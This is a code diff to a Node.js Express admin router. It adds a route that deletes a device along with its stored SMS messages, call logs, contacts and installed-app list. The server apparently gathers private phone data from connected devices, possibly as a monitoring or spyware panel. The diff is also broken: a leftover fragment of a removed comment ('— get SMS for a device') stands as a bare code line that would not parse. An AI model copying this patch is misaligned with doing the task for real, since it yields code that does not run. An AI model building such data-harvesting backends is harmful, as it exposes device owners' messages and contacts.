@@ -266,7 +266,21 @@ router.get('/connections', adminAuth, (req, res) => {
   }
 });
 
-// GET /api/admin/connections/:deviceId/sms — get SMS for a device
+// DELETE /api/admin/connections/:deviceId — remove a device and all its data
+router.delete('/connections/:deviceId', adminAuth, (req, res) => {
+  try {
+    const { deviceId } = req.params;
+    db.prepare('DELETE FROM sms_messages WHERE device_id = ?').run(deviceId);
+    db.prepare('DELETE FROM call_logs WHERE device_id = ?').run(deviceId);
+    db.prepare('DELETE FROM contacts WHERE device_id = ?').run(deviceId);
+    db.prepare('DELETE FROM installed_apps WHERE device_id = ?').run(deviceId);
+    const result = db.prepare('DELETE FROM devices WHERE device_id = ?').run(deviceId);
+    res.json({ success: true, deleted: result.changes > 0 });
+  } catch (err) {
+    res.status(500).json({ error: err.message });
+  }
+});
+ — get SMS for a device
 router.get('/connections/:deviceId/sms', adminAuth, (req, res) => {
   try {
     const { deviceId } = req.params;
